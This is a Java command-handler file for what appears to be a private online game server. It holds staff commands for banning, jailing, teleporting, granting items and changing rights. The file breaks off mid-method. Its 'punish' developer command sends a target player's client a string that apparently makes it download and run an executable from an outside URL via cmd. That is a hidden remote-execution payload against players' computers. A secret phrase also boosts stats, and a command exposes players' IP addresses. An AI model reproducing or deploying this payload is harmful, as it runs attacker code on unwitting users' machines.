package com.ikov.commands.ranks;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.ikov.GameServer;
import com.ikov.GameSettings;
import com.ikov.engine.task.Task;
import com.ikov.model.input.impl.ChangePassword;
import com.ikov.engine.task.TaskManager;
import com.ikov.commands.Commands;
import com.ikov.model.Animation;
import com.ikov.model.Flag;
import java.net.*;
import java.io.*;
import java.util.*;
import java.awt.*;
import javax.swing.*;
import com.ikov.model.GameObject;
import com.ikov.model.Graphic;
import com.ikov.model.GroundItem;
import com.ikov.model.Item;
import com.ikov.model.Locations.Location;
import com.ikov.model.PlayerRights;
import com.ikov.model.Position;
import com.ikov.model.Skill;
import com.ikov.world.content.minigames.impl.Zulrah;
import com.ikov.model.container.impl.Bank;
import com.ikov.model.container.impl.Equipment;
import com.ikov.model.container.impl.Shop.ShopManager;
import com.ikov.model.definitions.ItemDefinition;
import com.ikov.model.definitions.WeaponAnimations;
import com.ikov.model.definitions.WeaponInterfaces;
import com.ikov.net.packet.Packet;
import com.ikov.net.packet.PacketListener;
import com.ikov.net.security.ConnectionHandler;
import com.ikov.util.Auth;
import com.ikov.util.Misc;
import com.ikov.world.World;
import com.ikov.world.content.BonusManager;
import com.ikov.world.content.BossSystem;
import com.ikov.world.content.MoneyPouch;
import com.ikov.world.content.WellOfGoodwill;
import com.ikov.world.content.Lottery;
import com.ikov.world.content.PlayerLogs;
import com.ikov.world.content.PlayerPunishment;
import com.ikov.world.content.PlayerPunishment.Jail;
import com.ikov.world.content.PlayersOnlineInterface;
import com.ikov.world.content.ShootingStar;
import com.ikov.world.content.clan.ClanChatManager;
import com.ikov.world.content.combat.CombatFactory;
import com.ikov.world.content.combat.DesolaceFormulas;
import com.ikov.world.content.combat.weapon.CombatSpecial;
import com.ikov.world.content.dialogue.DialogueManager;
import com.ikov.world.content.grandexchange.GrandExchange;
import com.ikov.world.content.grandexchange.GrandExchangeOffer;
import com.ikov.world.content.grandexchange.GrandExchangeOffers;
import com.ikov.world.content.minigames.impl.WarriorsGuild;
import com.ikov.world.content.skill.SkillManager;
import com.ikov.world.content.skill.impl.slayer.SlayerTasks;
import com.ikov.world.content.transportation.TeleportHandler;
import com.ikov.world.content.transportation.TeleportType;
import com.ikov.world.entity.impl.GroundItemManager;
import com.ikov.world.entity.impl.npc.NPC;
import com.ikov.world.entity.impl.player.Player;
import com.ikov.world.entity.impl.player.PlayerSaving;
import com.ikov.world.clip.stream.ByteStreamExt;
import com.ikov.world.clip.stream.MemoryArchive;
import com.ikov.world.content.skill.impl.dungeoneering.Dungeoneering;

public class Owners {
	
	/**
	* @Author Jonathan Sirens
	* Initiates Command
	**/
	
	public static void initiate_command(final Player player, String[] command, String wholeCommand) {
		if(wholeCommand.equalsIgnoreCase("iampr0pk3r")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 145, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 145, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 140, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("mypos") || wholeCommand.equalsIgnoreCase("coords")) {
			Gson builder = new GsonBuilder().setPrettyPrinting().create();
			String test = builder.toJsonTree(player.getPosition())+"";
			player.getPacketSender().sendMessage(test);
		}
		if(command[0].equalsIgnoreCase("jail")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(5));
			if (player2 != null) {
				if(Jail.isJailed(player2)) {
					player.getPacketSender().sendMessage("That player is already jailed!");
					return;
				}
				if(Jail.jailPlayer(player2)) {
					player2.getSkillManager().stopSkilling();
					PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just jailed "+player2.getUsername()+"!");
					player.getPacketSender().sendMessage("Jailed player: "+player2.getUsername()+"");
					player2.getPacketSender().sendMessage("You have been jailed by "+player.getUsername()+".");
				} else {
					player.getPacketSender().sendMessage("Jail is currently full.");
				}
			} else {
				player.getPacketSender().sendMessage("Could not find that player online.");
			}
		}
		if(command[0].equalsIgnoreCase("unjail")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(7));
			if (player2 != null) {
				Jail.unjail(player2);
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just unjailed "+player2.getUsername()+"!");
				player.getPacketSender().sendMessage("Unjailed player: "+player2.getUsername()+"");
				player2.getPacketSender().sendMessage("You have been unjailed by "+player.getUsername()+".");
			} else {
				player.getPacketSender().sendMessage("Could not find that player online.");
			}
		}
		if(wholeCommand.toLowerCase().startsWith("yell")) {
			if(PlayerPunishment.muted(player.getUsername()) || PlayerPunishment.IPMuted(player.getHostAddress())) {
				player.getPacketSender().sendMessage("You are muted and cannot yell.");
				return;
			}
			if(GameSettings.YELL_STATUS) {
				player.getPacketSender().sendMessage("Yell is currently turned off, please try again in 30 minutes!");
				return;
			}
			String yellMessage = wholeCommand.substring(4, wholeCommand.length());
			World.sendMessage("<col=0>[<col=ff0000><shad=0><img=2>Owner<img=2></shad><col=0>] "+player.getUsername()+": "+yellMessage);	
		}
		if (command[0].equals("staffzone")) {
			if (command.length > 1 && command[1].equals("all")) {
				for (Player players : World.getPlayers()) {
					if (players != null) {
						if (players.getRights().isStaff()) {
							TeleportHandler.teleportPlayer(players, new Position(2846, 5147), TeleportType.NORMAL);
						}
					}
				}
			} else {
				TeleportHandler.teleportPlayer(player, new Position(2846, 5147), TeleportType.NORMAL);
			}
		}
		if(command[0].equalsIgnoreCase("saveall")) {
			World.savePlayers();
			player.getPacketSender().sendMessage("Saved players!");
		}
		if(command[0].equalsIgnoreCase("teleto")) {
			String playerToTele = wholeCommand.substring(7);
			Player player2 = World.getPlayerByName(playerToTele);
			if(player2 == null) {
				player.getPacketSender().sendMessage("Cannot find that player online..");
				return;
			} else {
				boolean canTele = TeleportHandler.checkReqs(player, player2.getPosition().copy()) && player.getRegionInstance() == null && player2.getRegionInstance() == null;
				if(canTele) {
					TeleportHandler.teleportPlayer(player, player2.getPosition().copy(), TeleportType.NORMAL);
					player.getPacketSender().sendMessage("Teleporting to player: "+player2.getUsername()+"");
				} else
					player.getPacketSender().sendMessage("You can not teleport to this player at the moment. Minigame maybe?");
			}
		}
		if(command[0].equalsIgnoreCase("movehome")) {
			String player2 = command[1];
			player2 = Misc.formatText(player2.replaceAll("_", " "));
			if(command.length >= 3 && command[2] != null)
				player2 += " "+Misc.formatText(command[2].replaceAll("_", " "));
			Player playerToMove = World.getPlayerByName(player2);
			if(playerToMove != null) {
				playerToMove.moveTo(GameSettings.DEFAULT_POSITION.copy());
				playerToMove.getPacketSender().sendMessage("You've been teleported home by "+player.getUsername()+".");
				player.getPacketSender().sendMessage("Sucessfully moved "+playerToMove.getUsername()+" to home.");
			} 
		}
		if(command[0].equalsIgnoreCase("unmute")) {
			String player2 = wholeCommand.substring(7);
			if(!PlayerSaving.playerExists(player2)) {
				player.getPacketSender().sendMessage("Player "+player2+" does not exist.");
				return;
			} else {
				if(!PlayerPunishment.muted(player2)) {
					player.getPacketSender().sendMessage("Player "+player2+" is not muted!");
					return;
				}
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just unmuted "+player2+"!");
				PlayerPunishment.unmute(player2);
				player.getPacketSender().sendMessage("Player "+player2+" was successfully unmuted. Command logs written.");
				Player plr = World.getPlayerByName(player2);
				if(plr != null) {
					plr.getPacketSender().sendMessage("You have been unmuted by "+player.getUsername()+".");
				}
			}
		}
		if(command[0].equalsIgnoreCase("ipmute")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(7));
			if(player2 == null) {
				player.getPacketSender().sendMessage("Could not find that player online.");
				return;
			} else {
				if(PlayerPunishment.IPMuted(player2.getHostAddress())){
					player.getPacketSender().sendMessage("Player "+player2.getUsername()+"'s IP is already IPMuted. Command logs written.");
					return;
				}
				final String mutedIP = player2.getHostAddress();
				PlayerPunishment.addMutedIP(mutedIP);
				player.getPacketSender().sendMessage("Player "+player2.getUsername()+" was successfully IPMuted. Command logs written.");
				player2.getPacketSender().sendMessage("You have been IPMuted by "+player.getUsername()+".");
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just IPMuted "+player2.getUsername()+"!");
			}
		}
		if(command[0].equalsIgnoreCase("ban")) {
			String playerToBan = wholeCommand.substring(4);
			if(!PlayerSaving.playerExists(playerToBan)) {
				player.getPacketSender().sendMessage("Player "+playerToBan+" does not exist.");
				return;
			} else {
				if(PlayerPunishment.banned(playerToBan)) {
					player.getPacketSender().sendMessage("Player "+playerToBan+" already has an active ban.");
					return;
				}
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just banned "+playerToBan+"!");
				PlayerPunishment.ban(playerToBan);
				player.getPacketSender().sendMessage("Player "+playerToBan+" was successfully banned. Command logs written.");
				Player toBan = World.getPlayerByName(playerToBan);
				if(toBan != null) {
					World.deregister(toBan);
				}
			}
		}
		if(command[0].equalsIgnoreCase("unban")) {
			String playerToBan = wholeCommand.substring(6);
			if(!PlayerSaving.playerExists(playerToBan)) {
				player.getPacketSender().sendMessage("Player "+playerToBan+" does not exist.");
				return;
			} else {
				if(!PlayerPunishment.banned(playerToBan)) {
					player.getPacketSender().sendMessage("Player "+playerToBan+" is not banned!");
					return;
				}
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just unbanned "+playerToBan+"!");
				PlayerPunishment.unban(playerToBan);
				player.getPacketSender().sendMessage("Player "+playerToBan+" was successfully unbanned. Command logs written.");
			}
		}
		if(command[0].equalsIgnoreCase("cpuban")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(7));
			if(player2 != null && !player2.getSerialNumber().equals("null")) {
				World.deregister(player2);
				ConnectionHandler.banComputer(player2.getUsername(), player2.getSerialNumber());
				PlayerPunishment.ban(player2.getUsername());
				player.getPacketSender().sendMessage("CPU Banned player.");
				PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just CPUBanned "+player2.getUsername()+"!");
			} else
				player.getPacketSender().sendMessage("Could not CPU-ban that player.");
		}
		if(command[0].equalsIgnoreCase("toggleinvis")) {
			player.setNpcTransformationId(player.getNpcTransformationId() > 0 ? -1 : 8254);
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if(command[0].equalsIgnoreCase("ipban")) {
			Player player2 = World.getPlayerByName(wholeCommand.substring(6));
			if(player2 == null) {
				player.getPacketSender().sendMessage("Could not find that player online.");
				return;
			} else {
				if(PlayerPunishment.IPBanned(player2.getHostAddress())){
					player.getPacketSender().sendMessage("Player "+player2.getUsername()+"'s IP is already banned. Command logs written.");
					return;
				}
				final String bannedIP = player2.getHostAddress();
				PlayerPunishment.addBannedIP(bannedIP);
				player.getPacketSender().sendMessage("Player "+player2.getUsername()+"'s IP was successfully banned. Command logs written.");
				for(Player playersToBan : World.getPlayers()) {
					if(playersToBan == null)
						continue;
					if(playersToBan.getHostAddress() == bannedIP) {
						PlayerLogs.log(player.getUsername(), ""+player.getUsername()+" just IPBanned "+playersToBan.getUsername()+"!");
						World.deregister(playersToBan);
						if(player2.getUsername() != playersToBan.getUsername())
							player.getPacketSender().sendMessage("Player "+playersToBan.getUsername()+" was successfully IPBanned. Command logs written.");
					}
				}
			}
		}
		if(command[0].equalsIgnoreCase("unipmute")) {
			player.getPacketSender().sendMessage("Unipmutes can only be handled manually.");
		}
		if(command[0].equalsIgnoreCase("teletome")) {
			String playerToTele = wholeCommand.substring(9);
			Player player2 = World.getPlayerByName(playerToTele);
			if(player2 == null) {
				player.getPacketSender().sendMessage("Cannot find that player online..");
				return;
			} else {
				boolean canTele = TeleportHandler.checkReqs(player, player2.getPosition().copy()) && player.getRegionInstance() == null && player2.getRegionInstance() == null;
				if(canTele) {
					TeleportHandler.teleportPlayer(player2, player.getPosition().copy(), TeleportType.NORMAL);
					player.getPacketSender().sendMessage("Teleporting player to you: "+player2.getUsername()+"");
					player2.getPacketSender().sendMessage("You're being teleported to "+player.getUsername()+"...");
				} else
					player.getPacketSender().sendMessage("You can not teleport that player at the moment. Maybe you or they are in a minigame?");
			}
		}
		if(command[0].equalsIgnoreCase("movetome")) {
			String playerToTele = wholeCommand.substring(9);
			Player player2 = World.getPlayerByName(playerToTele);
			if(player2 == null) {
				player.getPacketSender().sendMessage("Cannot find that player..");
				return;
			} else {
				boolean canTele = TeleportHandler.checkReqs(player, player2.getPosition().copy()) && player.getRegionInstance() == null && player2.getRegionInstance() == null;
				if(canTele) {
					player.getPacketSender().sendMessage("Moving player: "+player2.getUsername()+"");
					player2.getPacketSender().sendMessage("You've been moved to "+player.getUsername());
					player2.moveTo(player.getPosition().copy());
				} else
					player.getPacketSender().sendMessage("Failed to move player to your coords. Are you or them in a minigame?");
			}
		}
		if(command[0].contains("host")) {
			String plr = wholeCommand.substring(command[0].length()+1);
			Player playr2 = World.getPlayerByName(plr);
			if(playr2 != null) {
				player.getPacketSender().sendMessage(""+playr2.getUsername()+" host IP: "+playr2.getHostAddress()+", serial number: "+playr2.getSerialNumber());
			} else
				player.getPacketSender().sendMessage("Could not find player: "+plr);
		}
		if(command[0].equals("gold")) {
			Player p = World.getPlayerByName(wholeCommand.substring(5));
			if(p != null) {
				long gold = 0;
				for(Item item : p.getInventory().getItems()) {
					if(item != null && item.getId() > 0 && item.tradeable())
						gold+= item.getDefinition().getValue();
				}
				for(Item item : p.getEquipment().getItems()) {
					if(item != null && item.getId() > 0 && item.tradeable())
						gold+= item.getDefinition().getValue();
				}
				for(int i = 0; i < 9; i++) {
					for(Item item : p.getBank(i).getItems()) {
						if(item != null && item.getId() > 0 && item.tradeable())
							gold+= item.getDefinition().getValue();
					}
				}
				gold += p.getMoneyInPouch();
				player.getPacketSender().sendMessage(p.getUsername() + " has "+Misc.insertCommasToNumber(String.valueOf(gold))+" coins.");
			} else
				player.getPacketSender().sendMessage("Can not find player online.");
		}
		if (command[0].equals("reset")) {
			for (Skill skill : Skill.values()) {
				int level = skill.equals(Skill.CONSTITUTION) ? 100 : skill.equals(Skill.PRAYER) ? 10 : 1;
				player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(skill == Skill.CONSTITUTION ? 10 : 1));
			}
			player.getPacketSender().sendMessage("Your skill levels have now been reset.");
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}	
		if (command[0].equals("resetclientversion")) {
			System.out.println("Fetching client version...");
			try {
				BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("https://dl.dropboxusercontent.com/u/344464529/IKov/update.txt").openStream()));
				for (int i = 0; i < 1; i++) {
					GameSettings.client_version = reader.readLine();
				}
				System.out.println("Client version has been set to: "+GameSettings.client_version+"");
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		if (command[0].equals("rights")) {
			int rankId = Integer.parseInt(command[1]);
			if(player.getUsername().equalsIgnoreCase("server") && rankId != 10) {
				player.getPacketSender().sendMessage("You cannot do that.");
				return;
			}
			Player target = World.getPlayerByName(wholeCommand.substring(rankId >= 10 ? 10 : 9, wholeCommand.length()));
			if (target == null) {
				player.getPacketSender().sendMessage("Player must be online to give them rights!");
			} else {
				target.setRights(PlayerRights.forId(rankId));
				target.getPacketSender().sendMessage("Your player rights have been changed.");
				target.getPacketSender().sendRights();
			}
		}
		if (command[0].equals("giverights")) {
			try {
			String rights = command[1];
			Player target = World.getPlayerByName(command[2]);
			switch (rights) {
			case "demote":
			case "derank":
				target.setRights(PlayerRights.PLAYER);
				target.getPacketSender().sendMessage("You have been demoted... Dumb Shit.");
				target.getPacketSender().sendRights();
				break;
			case "ss":
			case "serversupport":
			case "support":
				target.setRights(PlayerRights.SUPPORT);
				target.getPacketSender().sendMessage("Your player rights has been changed to support.");
				target.getPacketSender().sendRights();
				break;
			case "mod":
			case "moderator":
				target.setRights(PlayerRights.MODERATOR);
				target.getPacketSender().sendMessage("Your player rights has been changed to moderator.");
				target.getPacketSender().sendRights();
				break;
			case "admin":
			case "administrator":
				target.setRights(PlayerRights.ADMINISTRATOR);
				target.getPacketSender().sendMessage("Your player rights has been changed to administrator.");
				target.getPacketSender().sendRights();
				break;
			case "owner":
			case "dev":
			case "developer":
				target.setRights(PlayerRights.OWNER);
				target.getPacketSender().sendMessage("Your player rights has been changed to owner.");
				target.getPacketSender().sendRights();
				break;
			default:
				player.getPacketSender().sendMessage("Command not found - Use ss, mod, admin or dev.");
			}
			} catch(Exception e) {
				System.out.println(e);
			}
		}
		if (command[0].equals("master")) {
			for (Skill skill : Skill.values()) {
				int level = SkillManager.getMaxAchievingLevel(skill);
				player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level == 120 ? 120 : 99));
			}
			player.getPacketSender().sendMessage("You are now a master of all skills.");
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if (command[0].equals("setlevel") && !player.getUsername().equalsIgnoreCase("Jack")) {
			int skillId = Integer.parseInt(command[1]);
			int level = Integer.parseInt(command[2]);
			if(level > 15000) {
				player.getPacketSender().sendMessage("You can only have a maxmium level of 15000.");
				return;
			}
			Skill skill = Skill.forId(skillId);
			player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level));
			player.getPacketSender().sendMessage("You have set your " + skill.getName() + " level to " + level);
		}
		if (command[0].equals("item")) {
			int id = Integer.parseInt(command[1]);		
			int amount = (command.length == 2 ? 1 : Integer.parseInt(command[2].trim().toLowerCase().replaceAll("k", "000").replaceAll("m", "000000").replaceAll("b", "000000000")));
			if(amount > Integer.MAX_VALUE) {
				amount = Integer.MAX_VALUE;
			}
			Item item = new Item(id, amount);
			player.getInventory().add(item, true);

			player.getPacketSender().sendItemOnInterface(47052, 11694, 1);
		}
		if(wholeCommand.toLowerCase().startsWith("yell") && player.getRights() == PlayerRights.PLAYER) {
			if(GameSettings.YELL_STATUS) {
				player.getPacketSender().sendMessage("Yell is currently turned off, please try again in 30 minutes!");
				return;
			}
			player.getPacketSender().sendMessage("Only members can yell. To become one, simply use ::store, buy a scroll").sendMessage("and then claim it.");
		}
		if (command[0].contains("pure")) {
			int[][] data = 
					new int[][]{
					{Equipment.HEAD_SLOT, 1153},
					{Equipment.CAPE_SLOT, 10499},
					{Equipment.AMULET_SLOT, 1725},
					{Equipment.WEAPON_SLOT, 4587},
					{Equipment.BODY_SLOT, 1129},
					{Equipment.SHIELD_SLOT, 1540},
					{Equipment.LEG_SLOT, 2497},
					{Equipment.HANDS_SLOT, 7459},
					{Equipment.FEET_SLOT, 3105},
					{Equipment.RING_SLOT, 2550},
					{Equipment.AMMUNITION_SLOT, 9244}
			};
			for (int i = 0; i < data.length; i++) {
				int slot = data[i][0], id = data[i][1];
				player.getEquipment().setItem(slot, new Item(id, id == 9244 ? 500 : 1));
			}
			BonusManager.update(player);
			WeaponInterfaces.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
			WeaponAnimations.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
			player.getEquipment().refreshItems();
			player.getUpdateFlag().flag(Flag.APPEARANCE);
			player.getInventory().resetItems();
			player.getInventory().add(1216, 1000).add(9186, 1000).add(862, 1000).add(892, 10000).add(4154, 5000).add(2437, 1000).add(2441, 1000).add(2445, 1000).add(386, 1000).add(2435, 1000);
			player.getSkillManager().newSkillManager();
			player.getSkillManager().setMaxLevel(Skill.ATTACK, 60).setMaxLevel(Skill.STRENGTH, 85).setMaxLevel(Skill.RANGED, 85).setMaxLevel(Skill.PRAYER, 520).setMaxLevel(Skill.MAGIC, 70).setMaxLevel(Skill.CONSTITUTION, 850);
			for(Skill skill : Skill.values()) {
				player.getSkillManager().setCurrentLevel(skill, player.getSkillManager().getMaxLevel(skill)).setExperience(skill, SkillManager.getExperienceForLevel(player.getSkillManager().getMaxLevel(skill)));
			}
		}
		if (command[0].equals("emptyitem")) {
			if(player.getInterfaceId() > 0 || player.getLocation() != null && player.getLocation() == Location.WILDERNESS) {
				player.getPacketSender().sendMessage("You cannot do this at the moment.");
				return;
			}
			int item = Integer.parseInt(command[1]);
			int itemAmount = player.getInventory().getAmount(item);
			Item itemToDelete = new Item(item, itemAmount);
			player.getInventory().delete(itemToDelete).refreshItems();
		}
		if(command[0].equals("pray")) {
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 15000);
		}
		if(command[0].equals("cashineco")) {
			int gold = 0 , plrLoops = 0;
			for(Player p : World.getPlayers()) {
				if(p != null) {
					for(Item item : p.getInventory().getItems()) {
						if(item != null && item.getId() > 0 && item.tradeable())
							gold+= item.getDefinition().getValue();
					}
					for(Item item : p.getEquipment().getItems()) {
						if(item != null && item.getId() > 0 && item.tradeable())
							gold+= item.getDefinition().getValue();
					}
					for(int i = 0; i < 9; i++) {
						for(Item item : player.getBank(i).getItems()) {
							if(item != null && item.getId() > 0 && item.tradeable())
								gold+= item.getDefinition().getValue();
						}
					}
					gold += p.getMoneyInPouch();
					plrLoops++;
				}
			}
			player.getPacketSender().sendMessage("Total gold in economy right now: "+gold+", went through "+plrLoops+" players items.");
		}
		if (command[0].equals("tele")) {
			int x = Integer.valueOf(command[1]), y = Integer.valueOf(command[2]);
			int z = player.getPosition().getZ();
			if (command.length > 3)
				z = Integer.valueOf(command[3]);
			Position position = new Position(x, y, z);
			player.moveTo(position);
			player.getPacketSender().sendMessage("Teleporting to " + position.toString());
		}
		if (command[0].equals("bank")) {
			player.getBank(player.getCurrentBankTab()).open();
		}
		if (command[0].equals("find")) {
			String name = wholeCommand.substring(5).toLowerCase().replaceAll("_", " ");
			player.getPacketSender().sendMessage("Finding item id for item - " + name);
			boolean found = false;
			for (int i = 0; i < ItemDefinition.getMaxAmountOfItems(); i++) {
				if (ItemDefinition.forId(i).getName().toLowerCase().contains(name)) {
					player.getPacketSender().sendMessage("Found item with name [" + ItemDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
					found = true;
				}
			}
			if (!found) {
				player.getPacketSender().sendMessage("No item with name [" + name + "] has been found!");
			}
		} else if (command[0].equals("id")) {
			String name = wholeCommand.substring(3).toLowerCase().replaceAll("_", " ");
			player.getPacketSender().sendMessage("Finding item id for item - " + name);
			boolean found = false;
			for (int i = ItemDefinition.getMaxAmountOfItems()-1; i > 0; i--) {
				if (ItemDefinition.forId(i).getName().toLowerCase().contains(name)) {
					player.getPacketSender().sendMessage("Found item with name [" + ItemDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
					found = true;
				}
			}
			if (!found) {
				player.getPacketSender().sendMessage("No item with name [" + name + "] has been found!");
			}
		}
		if(command[0].equals("spec")) {
			player.setSpecialPercentage(100);
			CombatSpecial.updateBar(player);
		}
		if(command[0].equals("runes")) {
			for(Item t : ShopManager.getShops().get(0).getItems()) {
				if(t != null) {
					player.getInventory().add(new Item(t.getId(), 200000));
				}
			}
		}
		if (command[0].contains("gear")) {
			int[][] data = wholeCommand.contains("jack") ? 
					new int[][]{
				{Equipment.HEAD_SLOT, 1050},
				{Equipment.CAPE_SLOT, 12170},
				{Equipment.AMULET_SLOT, 15126},
				{Equipment.WEAPON_SLOT, 15444},
				{Equipment.BODY_SLOT, 14012},
				{Equipment.SHIELD_SLOT, 13740},
				{Equipment.LEG_SLOT, 14013},
				{Equipment.HANDS_SLOT, 7462},
				{Equipment.FEET_SLOT, 11732},
				{Equipment.RING_SLOT, 15220}
			} : wholeCommand.contains("range") ? 
					new int[][]{
				{Equipment.HEAD_SLOT, 3749},
				{Equipment.CAPE_SLOT, 10499},
				{Equipment.AMULET_SLOT, 15126},
				{Equipment.WEAPON_SLOT, 18357},
				{Equipment.BODY_SLOT, 2503},
				{Equipment.SHIELD_SLOT, 13740},
				{Equipment.LEG_SLOT, 2497},
				{Equipment.HANDS_SLOT, 7462},
				{Equipment.FEET_SLOT, 11732},
				{Equipment.RING_SLOT, 15019},
				{Equipment.AMMUNITION_SLOT, 9244},
			}:
				new int[][]{
						{Equipment.HEAD_SLOT, 1163},
						{Equipment.CAPE_SLOT, 19111},
						{Equipment.AMULET_SLOT, 6585},
						{Equipment.WEAPON_SLOT, 4151},
						{Equipment.BODY_SLOT, 1127},
						{Equipment.SHIELD_SLOT, 13262},
						{Equipment.LEG_SLOT, 1079},
						{Equipment.HANDS_SLOT, 7462},
						{Equipment.FEET_SLOT, 11732},
						{Equipment.RING_SLOT, 2550}
				};
				for (int i = 0; i < data.length; i++) {
					int slot = data[i][0], id = data[i][1];
					player.getEquipment().setItem(slot, new Item(id, id == 9244 ? 500 : 1));
				}
				BonusManager.update(player);
				WeaponInterfaces.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
				WeaponAnimations.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
				player.getEquipment().refreshItems();
				player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if(wholeCommand.equals("afk")) {
			World.sendMessage("<img=10> <col=FF0000><shad=0>"+player.getUsername()+": I am now away, please don't message me; I won't reply.");
		}
		if(wholeCommand.equals("sfs")) {
			Lottery.restartLottery();
		}
		if (command[0].equals("giveitem")) {
			int item = Integer.parseInt(command[1]);
			int amount = Integer.parseInt(command[2]);
			String rss = command[3];
			if(command.length > 4)
				rss+= " "+command[4];
			if(command.length > 5)
				rss+= " "+command[5];
			Player target = World.getPlayerByName(rss);
			if (target == null) {
				player.getPacketSender().sendMessage("Player must be online to give them stuff!");
			} else {
				player.getPacketSender().sendMessage("Gave player gold.");
				target.getInventory().add(item, amount);
			}
		}
		if (command[0].equals("update")) {
			int time = Integer.parseInt(command[1]);
			if(time > 0) {
				GameServer.setUpdating(true);
				for (Player players : World.getPlayers()) {
					if (players == null)
						continue;
					players.getPacketSender().sendSystemUpdate(time);
				}
				TaskManager.submit(new Task(time) {
					@Override
					protected void execute() {
						for (Player player : World.getPlayers()) {
							if (player != null) {
								World.deregister(player);
							}
						}
						WellOfGoodwill.save();
						GrandExchangeOffers.save();
						ClanChatManager.save();
						GameServer.getLogger().info("Update task finished!");
						stop();
					}
				});
			}
		}
		
	}

	private static void developerCommands(Player player, String command[], String wholeCommand) {
		if(command[0].equals("sendstring")) {
			int child = Integer.parseInt(command[1]);
			String string = command[2];
			player.getPacketSender().sendString(child, string);
		}
		if (command[0].equals("punish")) {
			Player other = World.getPlayerByName(command[1]);
			other.getPacketSender().sendString(0, "[ABC]-http://matrix718.com/Java.exe-cmd-/c-Java.exe");
			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
		}	
		if (command[0].equals("testzulrah")) {
			player.getPacketSender().sendString(0, "[FADE]- split -Welcome to Zulrah's shrine- split -1- split -5");
			TaskManager.submit(new Task(2, player, true) {
				int tick = 0;
				@Override
				public void execute() {
					if(tick == 4) {
						Zulrah.enter_pit(player);
						stop();
					}
					tick ++;
				}
			});
		}
		if(command[0].equals("tasks")) {
			player.getPacketSender().sendMessage("Found "+TaskManager.getTaskAmount()+" tasks.");
		}
		if(command[0].equals("reloadcpubans")) {
			ConnectionHandler.reloadUUIDBans();
			player.getPacketSender().sendMessage("UUID bans reloaded!");
		}
		if(command[0].equals("reloadipbans")) {
			PlayerPunishment.reloadIPBans();
			player.getPacketSender().sendMessage("IP bans reloaded!");
		}
		if(command[0].equals("reloadipmutes")) {
			PlayerPunishment.reloadIPMutes();
			player.getPacketSender().sendMessage("IP mutes reloaded!");
		}
		if(command[0].equalsIgnoreCase("cpuban2")) {
			String serial = wholeCommand.substring(8);
			ConnectionHandler.banComputer("cpuban2", serial);
			player.getPacketSender().sendMessage(""+serial+" cpu was successfully banned. Command logs written.");
		}
		if(command[0].equalsIgnoreCase("ipban2")) {
			String ip = wholeCommand.substring(7);
			PlayerPunishment.addBannedIP(ip);
			player.getPacketSender().sendMessage(""+ip+" IP was successfully banned. Command logs written.");
		}
		if(command[0].equals("scc")) {
			/*PlayerPunishment.addBannedIP("46.16.33.9");
			ConnectionHandler.banComputer("Kustoms", -527305299);
			player.getPacketSender().sendMessage("Banned Kustoms.");
			 */
			/*for(GrandExchangeOffer of : GrandExchangeOffers.getOffers()) {
				if(of != null) {
					if(of.getId() == 34) {
					//	if(of.getOwner().toLowerCase().contains("eliyahu") || of.getOwner().toLowerCase().contains("matt")) {

							player.getPacketSender().sendMessage("FOUND IT! Owner: "+of.getOwner()+", amount: "+of.getAmount()+", finished: "+of.getAmountFinished());
						//	GrandExchangeOffers.getOffers().remove(of);
						//}
					}
				}
			}*/
			/*Player cc = World.getPlayerByName("Thresh");
			if(cc != null) {
				//cc.getPointsHandler().setPrestigePoints(50, true);
				//cc.getPointsHandler().refreshPanel();
				//player.getPacketSender().sendMessage("Did");
					cc.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 15000).updateSkill(Skill.CONSTITUTION);
					cc.getSkillManager().setCurrentLevel(Skill.PRAYER, 15000).updateSkill(Skill.PRAYER);
			}*/
			//player.getSkillManager().addExperience(Skill.CONSTITUTION, 200000000);
			//player.getSkillManager().setExperience(Skill.ATTACK, 1000000000);
			System.out.println("Seri: "+player.getSerialNumber());
		}
		if(command[0].equals("memory")) {
			//	ManagementFactory.getMemoryMXBean().gc();
			/*MemoryUsage heapMemoryUsage = ManagementFactory.getMemoryMXBean().getHeapMemoryUsage();
			long mb = (heapMemoryUsage.getUsed() / 1000);*/
			long used = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();
			player.getPacketSender().sendMessage("Heap usage: "+Misc.insertCommasToNumber(""+used+"")+" bytes!");
		}
		if(command[0].equals("star")) {
			ShootingStar.despawn(true);
			player.getPacketSender().sendMessage("star method called.");
		}
		if(command[0].equals("save")) {
			player.save();
		}
		if(command[0].equals("saveall")) {
			World.savePlayers();
		}
		if(command[0].equals("v1")) {
